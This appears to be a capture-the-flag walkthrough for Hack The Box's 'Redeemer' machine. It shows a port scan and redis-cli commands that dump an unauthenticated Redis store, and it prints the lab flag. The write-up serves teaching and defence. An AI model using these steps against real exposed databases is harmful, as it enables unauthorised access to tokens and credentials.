> **Disclaimer:** This writeup is published after the machine was retired from Hack The Box. All flags are unique per user.

# Redeemer

**Hack The Box** · Very Easy · Linux

`Redis` · `No Authentication` · `In-Memory Data Store`

---

## Overview

Redeemer introduces Redis — an in-memory key-value store often used for caching and session management. The machine runs a Redis instance with no authentication, allowing anyone to connect and dump all stored data.

---

## Reconnaissance

```bash
nmap -sC -sV -p- <TARGET_IP>
```

```
PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value store 5.0.7
```

Only one port, but it's outside nmap's default top 1000 scan. A standard `nmap -sC -sV` would miss this entirely — you need `-p 6379` or a full port scan (`-p-`) to catch it. Redis 5.0.7, no authentication banner.

---

## Dumping Redis Without Authentication

Redis is designed to be accessed by trusted clients inside a trusted network. When exposed without a password, it's fully open.

```bash
redis-cli -h <TARGET_IP>
```

```
<TARGET_IP>:6379> INFO server
# Server
redis_version:5.0.7
config_file:/etc/redis/redis.conf

<TARGET_IP>:6379> KEYS *
1) "temp"
2) "stor"
3) "numb"
4) "flag"

<TARGET_IP>:6379> GET flag
"03e1d2b376c37ab3f5319922053953eb"
```

`INFO server` confirms the version and that no password is set. `KEYS *` dumps every key in the current database (DB 0). Four keys total — one of them is literally named `flag`. `GET flag` retrieves it.

For a real engagement, you'd also want to check other databases (`SELECT 1` through `SELECT 15`) and look for session tokens, cached credentials, or application data.

---

## Takeaways

- Redis without authentication exposes all stored data. Production instances must set `requirepass` in `redis.conf`.
- Port 6379 is outside nmap's top 1000 — always include it explicitly (`-p 6379`) or scan all ports when testing infrastructure.
- In-memory data stores are high-value targets. They often hold session tokens, cached API responses, and temporary credentials that never hit disk.
- Key Redis commands for enumeration: `INFO` (server details), `KEYS *` (list all keys), `GET` (retrieve values), `SELECT` (switch databases).

---

*Walkthrough by Jack — 2026-02-16*
